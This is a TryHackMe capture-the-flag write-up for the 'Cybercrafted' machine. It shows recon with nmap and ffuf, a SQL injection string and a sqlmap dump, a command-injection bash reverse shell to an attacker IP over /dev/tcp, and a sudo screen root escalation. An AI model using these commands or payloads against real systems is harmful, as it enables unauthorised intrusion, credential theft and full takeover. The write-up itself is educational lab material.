# 🧠 Machine Name: Cybercrafted

## 📌 Overview

- **Platform:** TryHackMe
- **Difficulty:** Hard
- **OS:** Linux

---

## 🎯 Objective

Root the machine and capture all flags.

---

## 🔍 Reconnaissance

### 🔹 Nmap Scan

```bash
nmap -sC -sV -oN nmap.txt 10.10.x.x
```

**Results:**

- **22/tcp**: open ssh (OpenSSH 8.2p1)
- **80/tcp**: open http (Apache 2.4.41)
- **25565/tcp**: open minecraft (Minecraft Server 1.16.5)

👉 A Minecraft server! That's unique. Let's start with the web service.

---

## 🌐 Enumeration

### 🔹 VHost Discovery

I'll add `cybercrafted.thm` to `/etc/hosts` and search for subdomains:

```bash
ffuf -u http://cybercrafted.thm -H "Host: FUZZ.cybercrafted.thm" -w subdomains.txt -fs 0
```

**Found:**
- `admin.cybercrafted.thm`
- `store.cybercrafted.thm`

### 🔹 SQL Injection (Store)

The `store.cybercrafted.thm` page has a search feature for "items".
Testing for SQLi:
```bash
' OR 1=1--
```

👉 **Vulnerable!** I used `sqlmap` to dump the database.

```bash
sqlmap -u "http://store.cybercrafted.thm/search.php?name=test" --dump
```

I found credentials for the web admin: `admin:supersecretpassword123`.

---

## 🚨 Initial Access

### 🔹 Admin Panel Exploitation

Logging into `admin.cybercrafted.thm` with the discovered credentials.
The admin panel allows for some configuration changes that lead to Command Injection.

By injecting a reverse shell:
```bash
; bash -c "bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"
```

![](./cybercrafted_shell.png)

👉 **Access Granted!** logged in as `www-data`.

---

## 🧍‍♂️ Privilege Escalation

### 🔹 Pivoting to User (Cybercrafted)

I explored the `/opt/minecraft` directory.
Inside `logs/latest.log` and `server.properties`, I found references to a user named `cybercrafted`.
Further digging into the Minecraft plugin configs revealed a cleartext password: `minecraftisawesome`.

```bash
su cybercrafted
# Password: minecraftisawesome
```

👉 Now I am the `cybercrafted` user.

### 🔹 Root Escalation

Checking sudo privileges:
```bash
sudo -l
# User cybercrafted may run the following commands on cybercrafted:
# (root) NOPASSWD: /usr/bin/env screen
```

👉 **Screen Sudo Bypass!** 

If I can run `screen` as root, I just need to start a session and I'll have root permissions.

```bash
sudo /usr/bin/env screen
```

Once inside screen, I am **root**.

![](./cybercrafted_root.png)

---

## 🧪 Post-Exploitation

- Captured `user.txt` and `root.txt`.
- Stable session via SSH.

---

## 🧠 Lessons Learned

- **Subdomain enumeration** is critical when a machine has a dedicated domain.
- **Service logs** (like Minecraft) often contain sensitive information or accidental password leaks.
- **Sudo permissions** on binaries like `screen`, `tmux`, or `env` are extremely dangerous.

---

## 🧰 Tools Used

- nmap
- ffuf
- sqlmap
- netcat
- screen (sudo exploit)

---

![](./cybercrafted_win.png)
